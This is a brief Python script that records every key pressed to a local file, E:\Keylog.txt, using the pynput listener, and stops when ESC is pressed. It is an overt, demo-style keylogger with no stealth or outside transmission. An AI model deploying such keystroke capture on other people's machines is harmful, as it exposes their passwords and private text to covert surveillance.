from pynput import keyboard

def onPress(key):
    log_file = open("E:\\Keylog.txt", "a")
    try:
        char=key.char  # for key -> char conversion
    except AttributeError:  # for keys that do not have a char representation
        char=str(key)
    print(f"Keys pressed: {key}")
    log_file.write(f"{char}\n")
    log_file.close()
    if(char=="Key.esc"):
        return False

def main():
    print("Press ESC to quit logging.")
    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()

if __name__ == "__main__":
    main()